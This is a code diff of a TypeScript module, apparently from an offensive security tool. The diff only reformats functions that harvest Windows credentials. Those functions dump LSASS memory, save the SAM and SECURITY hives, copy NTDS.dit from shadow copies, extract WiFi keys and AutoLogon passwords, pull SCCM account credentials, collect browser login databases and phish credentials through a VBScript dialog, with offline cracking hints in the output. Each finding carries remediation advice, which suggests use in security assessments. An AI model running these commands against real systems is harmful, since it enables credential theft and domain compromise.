@@ -18,14 +18,26 @@ export async function lsassDump(args: string[], timeout: number): Promise<HookRe
       if (lsassPid) {
         output.push(`[*] LSASS PID: ${lsassPid}`)
         if (method === "comsvcs" || method === "minidump") {
-          const r = await cmd(`rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump ${lsassPid} "${outfile}" full`, timeout)
+          const r = await cmd(
+            `rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump ${lsassPid} "${outfile}" full`,
+            timeout,
+          )
           output.push(r.exitCode === 0 ? `[+] LSASS dumped to: ${outfile}` : `[!] Dump failed: ${r.stderr}`)
         }
         output.push(`\n[*] Additional cmd.exe methods:`)
         output.push(`    rundll32 comsvcs.dll, MiniDump ${lsassPid} out.dmp full`)
         output.push(`    procdump.exe -ma ${lsassPid} out.dmp (if SysInternals available)`)
         output.push(`    taskmgr.exe → right-click lsass → Create dump file`)
-        findings.push({ checkId: "WIN-LSASS-001", provider: "windows", severity: "critical", status: "EXECUTED", resource: `process://lsass/${lsassPid}`, title: `LSASS dump via cmd.exe rundll32 (PID: ${lsassPid})`, details: `Dumped to ${outfile}`, remediation: "Enable Credential Guard. Set RunAsPPL." })
+        findings.push({
+          checkId: "WIN-LSASS-001",
+          provider: "windows",
+          severity: "critical",
+          status: "EXECUTED",
+          resource: `process://lsass/${lsassPid}`,
+          title: `LSASS dump via cmd.exe rundll32 (PID: ${lsassPid})`,
+          details: `Dumped to ${outfile}`,
+          remediation: "Enable Credential Guard. Set RunAsPPL.",
+        })
       }
     }
     return { output: output.join("\n"), findings }
@@ -132,12 +144,23 @@ export async function samDump(args: string[], timeout: number): Promise<HookResu
     ]
     for (const h of hives) {
       const r = await cmd(`reg save ${h.key} "${outdir}\\${h.file}" /y`, timeout)
-      output.push(r.exitCode === 0 ? `[+] Saved: ${h.key} → ${outdir}\\${h.file}` : `[!] Failed: ${h.key} — ${r.stderr.trim()}`)
+      output.push(
+        r.exitCode === 0 ? `[+] Saved: ${h.key} → ${outdir}\\${h.file}` : `[!] Failed: ${h.key} — ${r.stderr.trim()}`,
+      )
     }
     output.push(`\n[*] Output directory: ${outdir}`)
     output.push("[*] Crack offline: secretsdump.py -sam sam.save -system system.save -security security.save LOCAL")
     output.push("[*] Or: impacket-secretsdump -sam sam.save -system system.save LOCAL")
-    findings.push({ checkId: "WIN-SAM-001", provider: "windows", severity: "critical", status: "EXTRACTED", resource: `file://${outdir}`, title: "SAM/SYSTEM/SECURITY hives extracted via reg save", details: `Saved to ${outdir}`, remediation: "Enable Credential Guard. Monitor reg save operations." })
+    findings.push({
+      checkId: "WIN-SAM-001",
+      provider: "windows",
+      severity: "critical",
+      status: "EXTRACTED",
+      resource: `file://${outdir}`,
+      title: "SAM/SYSTEM/SECURITY hives extracted via reg save",
+      details: `Saved to ${outdir}`,
+      remediation: "Enable Credential Guard. Monitor reg save operations.",
+    })
     return { output: output.join("\n"), findings }
   }
 
@@ -190,27 +213,57 @@ export async function dpapiExtract(args: string[], timeout: number): Promise<Hoo
     const chromePath = `%LOCALAPPDATA%\\Google\\Chrome\\User Data`
     const edgePath = `%LOCALAPPDATA%\\Microsoft\\Edge\\User Data`
     if (browser === "chrome" || browser === "all") {
-      const r = await cmd(`dir "${chromePath}\\Default\\Login Data" 2>nul && dir "${chromePath}\\Local State" 2>nul`, timeout)
-      output.push(r.stdout.includes("Login Data") ? "[+] Chrome Login Data found — contains saved passwords (DPAPI-encrypted)" : "[-] Chrome Login Data not found")
+      const r = await cmd(
+        `dir "${chromePath}\\Default\\Login Data" 2>nul && dir "${chromePath}\\Local State" 2>nul`,
+        timeout,
+      )
+      output.push(
+        r.stdout.includes("Login Data")
+          ? "[+] Chrome Login Data found — contains saved passwords (DPAPI-encrypted)"
+          : "[-] Chrome Login Data not found",
+      )
       if (r.stdout.includes("Login Data")) {
         output.push(`    Copy for offline extraction: copy "${chromePath}\\Default\\Login Data" %TEMP%\\logindata.db`)
         output.push(`    Copy master key: copy "${chromePath}\\Local State" %TEMP%\\localstate.json`)
         output.push(`    Decrypt with: SharpChromium.exe logins / DonPAPI / LaZagne`)
-        findings.push({ checkId: "WIN-DPAPI-CMD-001", provider: "windows", severity: "high", status: "ENUMERATED", resource: chromePath, title: "Chrome credential database found", details: "Login Data file present — DPAPI-encrypted passwords extractable offline", remediation: "Disable browser password saving via GPO" })
+        findings.push({
+          checkId: "WIN-DPAPI-CMD-001",
+          provider: "windows",
+          severity: "high",
+          status: "ENUMERATED",
+          resource: chromePath,
+          title: "Chrome credential database found",
+          details: "Login Data file present — DPAPI-encrypted passwords extractable offline",
+          remediation: "Disable browser password saving via GPO",
+        })
       }
     }
     if (browser === "edge" || browser === "all") {
       const r = await cmd(`dir "${edgePath}\\Default\\Login Data" 2>nul`, timeout)
-      output.push(r.stdout.includes("Login Data") ? "\n[+] Edge Login Data found — same DPAPI decryption as Chrome" : "\n[-] Edge Login Data not found")
+      output.push(
+        r.stdout.includes("Login Data")
+          ? "\n[+] Edge Login Data found — same DPAPI decryption as Chrome"
+          : "\n[-] Edge Login Data not found",
+      )
     }
     output.push("\n[*] WiFi passwords (netsh — no DPAPI needed):")
     const profiles = await cmd("netsh wlan show profiles", timeout)
-    const profileNames = profiles.stdout.match(/All User Profile\s*:\s*(.+)/g)?.map(l => l.split(":")[1].trim()) || []
+    const profileNames = profiles.stdout.match(/All User Profile\s*:\s*(.+)/g)?.map((l) => l.split(":")[1].trim()) || []
     for (const name of profileNames.slice(0, 20)) {
       const detail = await cmd(`netsh wlan show profile name="${name}" key=clear`, timeout)
       const key = detail.stdout.match(/Key Content\s*:\s*(.+)/)?.[1]?.trim()
       output.push(`    SSID: ${name}  Key: ${key || "<hidden>"}`)
-      if (key) findings.push({ checkId: `WIN-DPAPI-WIFI-${findings.length + 1}`, provider: "windows", severity: "high", status: "EXTRACTED", resource: `wifi://${name}`, title: `WiFi credential: ${name}`, details: `Cleartext WiFi key via netsh`, remediation: "Rotate WiFi password" })
+      if (key)
+        findings.push({
+          checkId: `WIN-DPAPI-WIFI-${findings.length + 1}`,
+          provider: "windows",
+          severity: "high",
+          status: "EXTRACTED",
+          resource: `wifi://${name}`,
+          title: `WiFi credential: ${name}`,
+          details: `Cleartext WiFi key via netsh`,
+          remediation: "Rotate WiFi password",
+        })
     }
     output.push("\n[*] Credential vault (cmdkey):")
     const ck = await cmd("cmdkey /list", timeout)
@@ -350,7 +403,16 @@ export async function credentialPrompt(args: string[], timeout: number): Promise
         output.push(`[+] Credentials captured!`)
         output.push(`    Username: ${parts[0]}`)
         output.push(`    Password: ${parts[1]}`)
-        findings.push({ checkId: "WIN-CREDPHISH-001", provider: "windows", severity: "critical", status: "CAPTURED", resource: `user://${parts[0]}`, title: `Credential phished via VBScript: ${parts[0]}`, details: `User entered credentials into VBScript dialog — title: "${title}"`, remediation: "Force password reset for this user" })
+        findings.push({
+          checkId: "WIN-CREDPHISH-001",
+          provider: "windows",
+          severity: "critical",
+          status: "CAPTURED",
+          resource: `user://${parts[0]}`,
+          title: `Credential phished via VBScript: ${parts[0]}`,
+          details: `User entered credentials into VBScript dialog — title: "${title}"`,
+          remediation: "Force password reset for this user",
+        })
       }
       if (r.stdout.includes("CANCELLED")) output.push("[!] User cancelled the credential dialog")
     } else {
@@ -435,22 +497,39 @@ export async function ntdsDump(args: string[], timeout: number): Promise<HookRes
     if (method === "vss" || method === "ifm") {
       output.push("[*] Creating Volume Shadow Copy via wmic...")
       const vss = await cmd(`wmic shadowcopy call create Volume="C:\\"`, timeout)
-      output.push(vss.stdout.includes("ReturnValue = 0") ? "[+] Shadow copy created" : `[!] Shadow copy failed: ${vss.stderr}`)
+      output.push(
+        vss.stdout.includes("ReturnValue = 0") ? "[+] Shadow copy created" : `[!] Shadow copy failed: ${vss.stderr}`,
+      )
       const shadows = await cmd("wmic shadowcopy get DeviceObject,InstallDate /format:list", timeout)
       const deviceMatch = shadows.stdout.match(/DeviceObject=(.+)/g)
       const lastShadow = deviceMatch ? deviceMatch[deviceMatch.length - 1].split("=")[1].trim() : ""
       if (lastShadow) {
         output.push(`[+] Shadow: ${lastShadow}`)
         await cmd(`mklink /d "${outdir}\\shadow" "${lastShadow}\\"`, timeout)
-        const copyNtds = await cmd(`esentutl.exe /y "${outdir}\\shadow\\Windows\\NTDS\\ntds.dit" /d "${outdir}\\ntds.dit" /o`, timeout)
-        output.push(copyNtds.exitCode === 0 ? "[+] NTDS.dit copied via esentutl" : "[!] esentutl failed — trying direct copy")
-        if (copyNtds.exitCode !== 0) await cmd(`copy "${outdir}\\shadow\\Windows\\NTDS\\ntds.dit" "${outdir}\\ntds.dit"`, timeout)
+        const copyNtds = await cmd(
+          `esentutl.exe /y "${outdir}\\shadow\\Windows\\NTDS\\ntds.dit" /d "${outdir}\\ntds.dit" /o`,
+          timeout,
+        )
+        output.push(
+          copyNtds.exitCode === 0 ? "[+] NTDS.dit copied via esentutl" : "[!] esentutl failed — trying direct copy",
+        )
+        if (copyNtds.exitCode !== 0)
+          await cmd(`copy "${outdir}\\shadow\\Windows\\NTDS\\ntds.dit" "${outdir}\\ntds.dit"`, timeout)
         await cmd(`reg save HKLM\\SYSTEM "${outdir}\\SYSTEM" /y`, timeout)
         await cmd(`reg save HKLM\\SECURITY "${outdir}\\SECURITY" /y`, timeout)
         await cmd(`rmdir "${outdir}\\shadow"`, timeout)
         output.push(`[+] SYSTEM + SECURITY hives saved`)
         output.push(`[+] Crack offline: secretsdump.py -ntds ${outdir}\\ntds.dit -system ${outdir}\\SYSTEM LOCAL`)
-        findings.push({ checkId: "WIN-NTDS-001", provider: "windows", severity: "critical", status: "EXTRACTED", resource: `ntds://${outdir}`, title: "NTDS.dit extracted via cmd.exe VSS + esentutl", details: `Output: ${outdir}`, remediation: "Rotate ALL domain passwords including krbtgt (twice)" })
+        findings.push({
+          checkId: "WIN-NTDS-001",
+          provider: "windows",
+          severity: "critical",
+          status: "EXTRACTED",
+          resource: `ntds://${outdir}`,
+          title: "NTDS.dit extracted via cmd.exe VSS + esentutl",
+          details: `Output: ${outdir}`,
+          remediation: "Rotate ALL domain passwords including krbtgt (twice)",
+        })
       }
     }
     if (method === "ifm") {
@@ -836,7 +915,10 @@ export async function cachedCreds(args: string[], timeout: number): Promise<Hook
 
   if (activeExec === "cmd" || activeExec === "bat") {
     output.push("=== Domain Cached Credentials (cmd.exe) ===\n")
-    const cachedCount = await cmd('reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v CachedLogonsCount 2>nul', timeout)
+    const cachedCount = await cmd(
+      'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v CachedLogonsCount 2>nul',
+      timeout,
+    )
     const countVal = cachedCount.stdout.match(/CachedLogonsCount\s+REG_SZ\s+(\S+)/)?.[1] || "default (10)"
     output.push(`[+] CachedLogonsCount policy: ${countVal}`)
     const tempDir = "C:\\Windows\\Temp\\cs-cache"
@@ -849,14 +931,25 @@ export async function cachedCreds(args: string[], timeout: number): Promise<Hook
       output.push(`[+] SYSTEM hive saved: ${tempDir}\\SYSTEM`)
       output.push(`[+] Extract with: secretsdump.py -security ${tempDir}\\SECURITY -system ${tempDir}\\SYSTEM LOCAL`)
       output.push(`[+] Hashcat mode: 2100 (DCC2) — format: $DCC2$10240#username#hash`)
-      findings.push({ checkId: "WIN-CACHE-001", provider: "windows", severity: "high", status: "EXTRACTED", resource: "registry://HKLM/SECURITY/Cache", title: "Domain Cached Credentials hives extracted via cmd.exe", details: "SECURITY + SYSTEM hives saved for offline DCC2 hash extraction", remediation: "Set CachedLogonsCount to 0-2 via GPO, enforce strong passwords" })
+      findings.push({
+        checkId: "WIN-CACHE-001",
+        provider: "windows",
+        severity: "high",
+        status: "EXTRACTED",
+        resource: "registry://HKLM/SECURITY/Cache",
+        title: "Domain Cached Credentials hives extracted via cmd.exe",
+        details: "SECURITY + SYSTEM hives saved for offline DCC2 hash extraction",
+        remediation: "Set CachedLogonsCount to 0-2 via GPO, enforce strong passwords",
+      })
     } else {
       output.push(`[!] Hive save failed — requires Administrator privileges`)
       output.push(`    SECURITY: ${secSave.stderr.trim()}`)
       output.push(`    SYSTEM: ${sysSave.stderr.trim()}`)
     }
     const nltest = await cmd("nltest /dsgetdc: 2>nul", timeout)
-    output.push(nltest.exitCode === 0 ? `\n[+] Domain info:\n${nltest.stdout}` : "\n[!] Not domain-joined or cannot reach DC")
+    output.push(
+      nltest.exitCode === 0 ? `\n[+] Domain info:\n${nltest.stdout}` : "\n[!] Not domain-joined or cannot reach DC",
+    )
     return { output: output.join("\n"), findings }
   }
 
@@ -1019,20 +1112,26 @@ export async function mssqlCreds(args: string[], timeout: number): Promise<HookR
     if (!tool) {
       output.push("[!] Neither sqlcmd nor osql found in PATH")
       output.push("[*] Install SQL Server command line tools or use PS mode")
-      output.push("[*] Manual: sqlcmd -S <server> -E -Q \"SELECT @@VERSION\"")
+      output.push('[*] Manual: sqlcmd -S <server> -E -Q "SELECT @@VERSION"')
       return { output: output.join("\n"), findings }
     }
     output.push(`[+] Using ${tool} for SQL queries\n`)
     const authFlag = user && password ? `-U ${user} -P ${password}` : "-E"
     const sqlExec = (query: string) => cmd(`${tool} -S ${server} ${authFlag} -Q "${query}" -h -1 -W`, timeout)
     const ver = await sqlExec("SELECT @@VERSION")
-    output.push(ver.exitCode === 0 ? `[+] Connected: ${ver.stdout.trim().split("\\n")[0]}` : `[!] Connection failed: ${ver.stderr}`)
+    output.push(
+      ver.exitCode === 0
+        ? `[+] Connected: ${ver.stdout.trim().split("\\n")[0]}`
+        : `[!] Connection failed: ${ver.stderr}`,
+    )
     if (ver.exitCode !== 0) return { output: output.join("\n"), findings }
     const info = await sqlExec("SELECT SYSTEM_USER + ' | ' + CONVERT(VARCHAR, IS_SRVROLEMEMBER('sysadmin'))")
     output.push(`[*] Login: ${info.stdout.trim()}`)
     const linked = await sqlExec("SELECT srvname + ' | ' + providername FROM master.sys.sysservers WHERE srvid > 0")
     output.push(`\n[*] Linked servers:\n${linked.stdout.trim() || "    None"}`)
-    const xp = await sqlExec("SELECT CONVERT(INT, ISNULL(value, value_in_use)) FROM sys.configurations WHERE name = 'xp_cmdshell'")
+    const xp = await sqlExec(
+      "SELECT CONVERT(INT, ISNULL(value, value_in_use)) FROM sys.configurations WHERE name = 'xp_cmdshell'",
+    )
     const xpEnabled = xp.stdout.trim() === "1"
     output.push(xpEnabled ? "\n[!] xp_cmdshell is ENABLED" : "\n[-] xp_cmdshell is disabled")
     if (xpEnabled) {
@@ -1041,9 +1140,20 @@ export async function mssqlCreds(args: string[], timeout: number): Promise<HookR
     }
     const creds = await sqlExec("SELECT name + ' => ' + credential_identity FROM sys.credentials")
     if (creds.stdout.trim()) output.push(`\n[*] SQL credentials:\n${creds.stdout.trim()}`)
-    const impersonate = await sqlExec("SELECT DISTINCT b.name FROM sys.server_permissions a JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'")
+    const impersonate = await sqlExec(
+      "SELECT DISTINCT b.name FROM sys.server_permissions a JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'",
+    )
     if (impersonate.stdout.trim()) output.push(`\n[*] Can impersonate:\n${impersonate.stdout.trim()}`)
-    findings.push({ checkId: "WIN-MSSQL-001", provider: "windows", severity: "critical", status: "EXTRACTED", resource: `mssql://${server}`, title: `MSSQL enumerated via ${tool}`, details: "SQL Server queried using cmd-native sqlcmd/osql", remediation: "Rotate SQL credentials, disable xp_cmdshell" })
+    findings.push({
+      checkId: "WIN-MSSQL-001",
+      provider: "windows",
+      severity: "critical",
+      status: "EXTRACTED",
+      resource: `mssql://${server}`,
+      title: `MSSQL enumerated via ${tool}`,
+      details: "SQL Server queried using cmd-native sqlcmd/osql",
+      remediation: "Rotate SQL credentials, disable xp_cmdshell",
+    })
     return { output: output.join("\n"), findings }
   }
 
@@ -1229,7 +1339,9 @@ export async function wifiDump(args: string[], timeout: number): Promise<HookRes
       output.push("[!] WiFi service not available")
       return { output: output.join("\n"), findings }
     }
-    const profileNames = (profiles.stdout.match(/All User Profile\s+:\s+(.+)/g) || []).map((m) => m.replace(/All User Profile\s+:\s+/, "").trim())
+    const profileNames = (profiles.stdout.match(/All User Profile\s+:\s+(.+)/g) || []).map((m) =>
+      m.replace(/All User Profile\s+:\s+/, "").trim(),
+    )
     output.push(`[+] WiFi profiles found: ${profileNames.length}\n`)
     for (const name of profileNames) {
       const detail = await cmd(`netsh wlan show profile name="${name}" key=clear`, timeout)
@@ -1242,7 +1354,16 @@ export async function wifiDump(args: string[], timeout: number): Promise<HookRes
       output.push(`[+] ${name}`)
       output.push(`    Auth: ${auth} | Cipher: ${cipher} | Password: ${password}`)
       if (password !== "N/A") {
-        findings.push({ checkId: `WIN-WIFI-${findings.length + 1}`, provider: "windows", severity: "high", status: "EXTRACTED", resource: `wifi://${name}`, title: `WiFi password extracted: ${name}`, details: `Auth: ${auth}, Password recovered via netsh`, remediation: "Use enterprise WPA2/WPA3 with RADIUS. Rotate WiFi passwords." })
+        findings.push({
+          checkId: `WIN-WIFI-${findings.length + 1}`,
+          provider: "windows",
+          severity: "high",
+          status: "EXTRACTED",
+          resource: `wifi://${name}`,
+          title: `WiFi password extracted: ${name}`,
+          details: `Auth: ${auth}, Password recovered via netsh`,
+          remediation: "Use enterprise WPA2/WPA3 with RADIUS. Rotate WiFi passwords.",
+        })
       }
     }
     return { output: output.join("\n"), findings }
@@ -1349,7 +1470,16 @@ export async function vaultDump(args: string[], timeout: number): Promise<HookRe
     const targets = ck.stdout.match(/Target:/g)?.length || 0
     if (targets > 0) {
       output.push(`[+] Found ${targets} stored credential(s)`)
-      findings.push({ checkId: "WIN-VAULT-001", provider: "windows", severity: "high", status: "EXTRACTED", resource: "vault://cmdkey", title: `${targets} stored credentials found via cmdkey`, details: "Stored credentials enumerated — includes Windows, web, and generic credentials", remediation: "Clear stored credentials with cmdkey /delete" })
+      findings.push({
+        checkId: "WIN-VAULT-001",
+        provider: "windows",
+        severity: "high",
+        status: "EXTRACTED",
+        resource: "vault://cmdkey",
+        title: `${targets} stored credentials found via cmdkey`,
+        details: "Stored credentials enumerated — includes Windows, web, and generic credentials",
+        remediation: "Clear stored credentials with cmdkey /delete",
+      })
     }
     output.push("\n=== Credential Manager (GUI) ===")
     const keymgr = await cmd("where rundll32 2>nul", timeout)
@@ -1362,7 +1492,10 @@ export async function vaultDump(args: string[], timeout: number): Promise<HookRe
       output.push("[-] No RDP saved connections")
     }
     output.push("\n=== Remote Desktop Connection Manager Files ===")
-    const rdcman = await cmd('dir /s /b "%LOCALAPPDATA%\\Microsoft\\Remote Desktop Connection Manager\\*.rdg" 2>nul', timeout)
+    const rdcman = await cmd(
+      'dir /s /b "%LOCALAPPDATA%\\Microsoft\\Remote Desktop Connection Manager\\*.rdg" 2>nul',
+      timeout,
+    )
     output.push(rdcman.stdout.trim() ? `[+] RDCMan files found:\n${rdcman.stdout}` : "[-] No RDCMan .rdg files")
     return { output: output.join("\n"), findings }
   }
@@ -1552,29 +1685,55 @@ export async function sccmAbuse(args: string[], timeout: number): Promise<HookRe
   if (activeExec === "cmd" || activeExec === "bat" || activeExec === "wmic") {
     output.push("=== SCCM/MECM Enumeration (cmd.exe) ===\n")
     const sccmSvc = await cmd("sc query CcmExec 2>nul", timeout)
-    output.push(sccmSvc.stdout.includes("RUNNING") ? "[+] SCCM Client service: RUNNING" : sccmSvc.stdout.includes("CcmExec") ? "[*] SCCM Client installed but not running" : "[-] SCCM Client not installed")
+    output.push(
+      sccmSvc.stdout.includes("RUNNING")
+        ? "[+] SCCM Client service: RUNNING"
+        : sccmSvc.stdout.includes("CcmExec")
+          ? "[*] SCCM Client installed but not running"
+          : "[-] SCCM Client not installed",
+    )
     if (!sccmSvc.stdout.includes("CcmExec")) return { output: output.join("\n"), findings }
     const ccmSetup = await cmd('reg query "HKLM\\SOFTWARE\\Microsoft\\CCMSetup" 2>nul', timeout)
     if (ccmSetup.stdout.includes("BaseUrl")) output.push(`[+] CCMSetup registry:\n${ccmSetup.stdout}`)
     if (action === "naa") {
       output.push("\n[*] Attempting NAA extraction via WMIC...")
-      const naa = await cmd('wmic /namespace:"\\\\root\\ccm\\policy\\Machine\\ActualConfig" path CCM_NetworkAccessAccount get NetworkAccessUsername,NetworkAccessPassword /format:list 2>nul', timeout)
+      const naa = await cmd(
+        'wmic /namespace:"\\\\root\\ccm\\policy\\Machine\\ActualConfig" path CCM_NetworkAccessAccount get NetworkAccessUsername,NetworkAccessPassword /format:list 2>nul',
+        timeout,
+      )
       if (naa.stdout.includes("NetworkAccessUsername")) {
         output.push("[+] NAA credentials found (obfuscated):")
         output.push(naa.stdout)
         output.push("[*] Decrypt with: SharpSCCM.exe local secrets -m wmi")
-        findings.push({ checkId: "WIN-SCCM-001", provider: "windows", severity: "critical", status: "EXTRACTED", resource: "sccm://naa", title: "SCCM NAA credentials found via WMIC", details: "Network Access Account credentials discovered", remediation: "Remove NAA configuration, use Enhanced HTTP" })
+        findings.push({
+          checkId: "WIN-SCCM-001",
+          provider: "windows",
+          severity: "critical",
+          status: "EXTRACTED",
+          resource: "sccm://naa",
+          title: "SCCM NAA credentials found via WMIC",
+          details: "Network Access Account credentials discovered",
+          remediation: "Remove NAA configuration, use Enhanced HTTP",
+        })
       } else {
         output.push("[-] No NAA configured or WMIC access denied")
       }
     }
     if (action === "collections") {
-      const vars = await cmd('wmic /namespace:"\\\\root\\ccm\\policy\\Machine\\ActualConfig" path CCM_CollectionVariable get Name,Value /format:list 2>nul', timeout)
-      output.push(vars.stdout.includes("Name=") ? `[+] Collection variables:\n${vars.stdout}` : "[-] No collection variables")
+      const vars = await cmd(
+        'wmic /namespace:"\\\\root\\ccm\\policy\\Machine\\ActualConfig" path CCM_CollectionVariable get Name,Value /format:list 2>nul',
+        timeout,
+      )
+      output.push(
+        vars.stdout.includes("Name=") ? `[+] Collection variables:\n${vars.stdout}` : "[-] No collection variables",
+      )
     }
     if (action === "policy") {
       output.push("\n[*] SCCM WMI namespaces:")
-      const classes = await cmd('wmic /namespace:"\\\\root\\ccm\\policy\\Machine\\ActualConfig" path __CLASS get __CLASS /format:list 2>nul', timeout)
+      const classes = await cmd(
+        'wmic /namespace:"\\\\root\\ccm\\policy\\Machine\\ActualConfig" path __CLASS get __CLASS /format:list 2>nul',
+        timeout,
+      )
       const clsCount = (classes.stdout.match(/__CLASS=/g) || []).length
       output.push(`    ActualConfig classes: ${clsCount}`)
     }
@@ -1865,15 +2024,23 @@ export async function browserHarvest(args: string[], timeout: number): Promise<H
     for (const b of browsers) {
       if (browser !== "all" && b.name.toLowerCase() !== browser.toLowerCase()) continue
       const exists = await cmd(`dir "${b.path}\\Default\\Login Data" 2>nul`, timeout)
-      if (!exists.stdout.includes("Login Data")) { output.push(`[-] ${b.name}: not found`); continue }
+      if (!exists.stdout.includes("Login Data")) {
+        output.push(`[-] ${b.name}: not found`)
+        continue
+      }
       output.push(`=== ${b.name} ===`)
       output.push(`[+] Login Data: ${b.path}\\Default\\Login Data`)
       if (action === "passwords" || action === "all") {
-        output.push(`    [*] Copy for offline decrypt: copy "${b.path}\\Default\\Login Data" %TEMP%\\${b.name.toLowerCase()}-login.db`)
+        output.push(
+          `    [*] Copy for offline decrypt: copy "${b.path}\\Default\\Login Data" %TEMP%\\${b.name.toLowerCase()}-login.db`,
+        )
         output.push(`    [*] Copy master key: copy "${b.path}\\Local State" %TEMP%\\${b.name.toLowerCase()}-state.json`)
       }
       if (action === "cookies" || action === "all") {
-        const cookies = await cmd(`dir "${b.path}\\Default\\Network\\Cookies" 2>nul && dir "${b.path}\\Default\\Cookies" 2>nul`, timeout)
+        const cookies = await cmd(
+          `dir "${b.path}\\Default\\Network\\Cookies" 2>nul && dir "${b.path}\\Default\\Cookies" 2>nul`,
+          timeout,
+        )
         output.push(cookies.stdout.includes("Cookies") ? `[+] Cookie DB found` : "[-] No cookie DB")
       }
       if (action === "history" || action === "all") {
@@ -1893,14 +2060,27 @@ export async function browserHarvest(args: string[], timeout: number): Promise<H
         for (const p of ff.stdout.trim().split("\n").filter(Boolean)) {
           output.push(`[*] Profile: ${p.trim()}`)
           const logins = await cmd(`dir "${ffProfiles}\\${p.trim()}\\logins.json" 2>nul`, timeout)
-          output.push(logins.stdout.includes("logins.json") ? "    [+] logins.json found — decrypt with firefox_decrypt.py" : "    [-] No saved logins")
+          output.push(
+            logins.stdout.includes("logins.json")
+              ? "    [+] logins.json found — decrypt with firefox_decrypt.py"
+              : "    [-] No saved logins",
+          )
         }
       }
     }
     output.push("\n[*] Offline decryption tools:")
     output.push("    SharpChromium.exe logins / DonPAPI / LaZagne / HackBrowserData")
     output.push("    firefox_decrypt.py (for Firefox NSS-encrypted credentials)")
-    findings.push({ checkId: "WIN-BROWSER-001", provider: "windows", severity: "medium", status: "ENUMERATED", resource: "browser://credentials", title: "Browser credential files discovered via cmd.exe", details: "Login Data, cookies, history files located for offline extraction", remediation: "Disable browser password saving via GPO" })
+    findings.push({
+      checkId: "WIN-BROWSER-001",
+      provider: "windows",
+      severity: "medium",
+      status: "ENUMERATED",
+      resource: "browser://credentials",
+      title: "Browser credential files discovered via cmd.exe",
+      details: "Login Data, cookies, history files located for offline extraction",
+      remediation: "Disable browser password saving via GPO",
+    })
     return { output: output.join("\n"), findings }
   }
 
@@ -2115,15 +2295,33 @@ export async function regSecrets(args: string[], timeout: number): Promise<HookR
   if (activeExec === "cmd" || activeExec === "bat") {
     if (action === "autologon" || action === "full") {
       output.push("=== AutoLogon Credentials (reg query) ===")
-      const winlogon = await cmd('reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultUserName 2>nul', timeout)
-      const password = await cmd('reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultPassword 2>nul', timeout)
-      const domain = await cmd('reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultDomainName 2>nul', timeout)
+      const winlogon = await cmd(
+        'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultUserName 2>nul',
+        timeout,
+      )
+      const password = await cmd(
+        'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultPassword 2>nul',
+        timeout,
+      )
+      const domain = await cmd(
+        'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultDomainName 2>nul',
+        timeout,
+      )
       const user = winlogon.stdout.match(/DefaultUserName\s+REG_SZ\s+(.+)/)?.[1]?.trim()
       const pass = password.stdout.match(/DefaultPassword\s+REG_SZ\s+(.+)/)?.[1]?.trim()
       const dom = domain.stdout.match(/DefaultDomainName\s+REG_SZ\s+(.+)/)?.[1]?.trim()
       if (pass) {
         output.push(`[!!!] AutoLogon ENABLED — ${dom || ""}\\${user || ""} : ${pass}`)
-        findings.push({ checkId: "WIN-REG-AUTOLOGON", provider: "windows", severity: "critical", status: "VULNERABLE", resource: "registry://Winlogon", title: "AutoLogon cleartext password", details: `${dom}\\${user} : ${pass}`, remediation: "Remove DefaultPassword from registry." })
+        findings.push({
+          checkId: "WIN-REG-AUTOLOGON",
+          provider: "windows",
+          severity: "critical",
+          status: "VULNERABLE",
+          resource: "registry://Winlogon",
+          title: "AutoLogon cleartext password",
+          details: `${dom}\\${user} : ${pass}`,
+          remediation: "Remove DefaultPassword from registry.",
+        })
       }
       if (!pass) output.push("[*] No AutoLogon password configured")
     }
@@ -2140,7 +2338,16 @@ export async function regSecrets(args: string[], timeout: number): Promise<HookR
         if (r.stdout.includes("Password")) {
           output.push(`[!] VNC password found: ${key}`)
           output.push(`    ${r.stdout.trim()}`)
-          findings.push({ checkId: "WIN-REG-VNC", provider: "windows", severity: "high", status: "VULNERABLE", resource: `registry://${key}`, title: "VNC encrypted password in registry", details: key, remediation: "Remove VNC or use strong auth." })
+          findings.push({
+            checkId: "WIN-REG-VNC",
+            provider: "windows",
+            severity: "high",
+            status: "VULNERABLE",
+            resource: `registry://${key}`,
+            title: "VNC encrypted password in registry",
+            details: key,
+            remediation: "Remove VNC or use strong auth.",
+          })
         }
       }
     }
@@ -2156,13 +2363,31 @@ export async function regSecrets(args: string[], timeout: number): Promise<HookR
         for (const u of userNames) output.push(`    ${u.trim()}`)
         for (const p of proxyPasses) {
           output.push(`    [!!!] ${p.trim()}`)
-          findings.push({ checkId: "WIN-REG-PUTTY", provider: "windows", severity: "high", status: "VULNERABLE", resource: "registry://PuTTY", title: "PuTTY proxy password", details: p.trim(), remediation: "Remove stored passwords." })
+          findings.push({
+            checkId: "WIN-REG-PUTTY",
+            provider: "windows",
+            severity: "high",
+            status: "VULNERABLE",
+            resource: "registry://PuTTY",
+            title: "PuTTY proxy password",
+            details: p.trim(),
+            remediation: "Remove stored passwords.",
+          })
         }
       }
       const winscp = await cmd('reg query "HKCU\\SOFTWARE\\Martin Prikryl\\WinSCP 2\\Sessions" /s 2>nul', timeout)
       if (winscp.stdout.includes("Password")) {
         output.push("[!] WinSCP stored credentials found")
-        findings.push({ checkId: "WIN-REG-WINSCP", provider: "windows", severity: "high", status: "VULNERABLE", resource: "registry://WinSCP", title: "WinSCP stored credentials", details: "Encrypted passwords in registry", remediation: "Use key-based auth." })
+        findings.push({
+          checkId: "WIN-REG-WINSCP",
+          provider: "windows",
+          severity: "high",
+          status: "VULNERABLE",
+          resource: "registry://WinSCP",
